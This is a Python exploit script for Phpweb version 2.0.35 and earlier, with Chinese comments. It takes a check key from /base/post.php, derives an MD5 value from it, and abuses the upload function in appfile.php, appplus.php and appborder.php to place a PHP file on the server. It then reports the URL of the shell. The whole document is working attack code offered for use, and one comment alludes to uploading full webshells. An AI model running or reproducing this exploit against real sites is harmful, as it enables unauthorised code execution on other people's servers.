# !/usr/bin/env python
# coding=utf-8
# python version 3.7
# Phpweb<=2.0.35
# 漏洞参考 https://m4tir.github.io/Phpweb-Reception-Getshell
# 漏洞影响文件:/base/post.php /base/appfile.php /base/appplue.php /base/appborder.php
import sys
import requests
import hashlib

# 各文件只使用了upload功能
appfile_act = ['upload']
appappplue_act = ['upload', 'mkdir', 'dbinstall']
appborder_act = ['upload', 'mkdir', 'dbinstall', 'mktempdir']
# 构造请求数据，格式很重要，请勿更改
header_guEss = {'Content-Type': 'multipart/form-data; boundary="guEss"'}
apppoc = """--guEss
Content-Disposition: form-data; name="file"; filename="readme.php"
Content-Type: application/octet-stream\n
<?echo "Hello guEss";?>
--guEss
Content-Disposition: form-data; name="t"\n\na\n--guEss
Content-Disposition: form-data; name="act"\n\nupload\n--guEss
Content-Disposition: form-data; name="r_size"\n\n23\n--guEss
Content-Disposition: form-data; name="m"\n\n"""

# appfile.php文件利用
def appfilepoc(url):
    # 得到加密后的MD5值
    postmd5 = {"act": "appcode"}
    r = requests.post(url + '/base/post.php', data=postmd5)
    if r.text.__len__() > 32:
        m = hashlib.md5()
        m.update((r.text[2:34] + "a").encode(encoding='utf-8'))
        gmd5 = m.hexdigest()
        print('gmd5:' + gmd5)
        # 构造poc并发送
        pocdata = apppoc + gmd5 + '\n--guEss\n'
        r = requests.post(url + '/base/appfile.php', data=pocdata, headers=header_guEss)  # 有的大马会将文件名改为appfile1.php你懂的
        r.encoding = 'utf-8'
        print(r.text)
        if r.text.find('ERROR') == -1:
            print('get shell success:' + url + '/effect/source/bg/readme.php')
            return url + '/effect/source/bg/readme.php'
    else:
        print('error:can`t get check key')
    return ''

# appplus.php文件利用
def apppluspoc(url):
    coltypelist = ['effect', 'news', 'index', 'down', 'search', 'photo', 'feedback']
    pluslablelist = ['all', 'news', 'search', 'index', 'photo']
    for p in pluslablelist:
        for c in coltypelist:
            postmd5 = {"act": "appcode", "apptype": "plus", "pluslable": p, "coltype": c}
            r = requests.post(url + '/base/post.php', data=postmd5)
            print(r.text)
            if r.text.__len__() < 32:
                continue
            m = hashlib.md5()
            m.update((r.text[2:34] + "a").encode(encoding='utf-8'))
            gmd5 = m.hexdigest()
            print('gmd5:' + gmd5)
            break
        if gmd5 != '':
            break
    if gmd5 != '':
        pathpoc = """Content-Disposition: form-data; name="path"\n\n"""
        pathlist = ['photo', 'news', 'tools', 'update']
        for p in pathlist:
            pocdata = apppoc + gmd5 + '\n--guEss\n' + pathpoc + p + '\n--guEss\n'
            r = requests.post(url + '/base/appplus.php', data=pocdata, headers=header_guEss)
            r.encoding = 'utf-8'
            print(r.text)
            if r.text.find('ERROR') == -1:
                print('get shell success:' + url + '/'+p+'/readme.php')
                return url + '/'+p+'/readme.php'
    else:
        print('error:can`t get check key')
    return ''

# appborder.php文件利用
def appborderpoc(url):
    templist = ['781', '780', '788', '001', '012', '015', '016', '018', '051', '201', '204', '500', '526', '613', '614']
    gmd5 = ''
    for t in templist:
        postmd5 = {"act": "appcode", "apptype": "border", "tempid": t}
        r = requests.post(url + '/base/post.php', data=postmd5)
        print(r.text)
        if r.text.__len__() < 32:
            continue
        m = hashlib.md5()
        m.update((r.text[2:34] + "a").encode(encoding='utf-8'))
        gmd5 = m.hexdigest()
        print('gmd5:' + gmd5)
        break
    if gmd5 != '':
        tempidpoc = """Content-Disposition: form-data; name="tempid"\n\n"""
        for t in templist:
            pocdata = apppoc + gmd5 + '\n--guEss\n' + tempidpoc + t + '\n--guEss\n'
            r = requests.post(url + '/base/appborder.php', data=pocdata, headers=header_guEss)
            r.encoding = 'utf-8'
            print(r.text)
            if r.text.find('ERROR') == -1:
                print('get shell success:' + url + '/base/border/' + t + '/readme.php')
                return url + '/base/border/' + t + '/readme.php'
    else:
        print('error:can`t get check key')
    return ''
if __name__ == "__main__":
    url = 'http://www.xxx.com'
    appfilepoc(url)
    apppluspoc(url)
    appborderpoc(url)
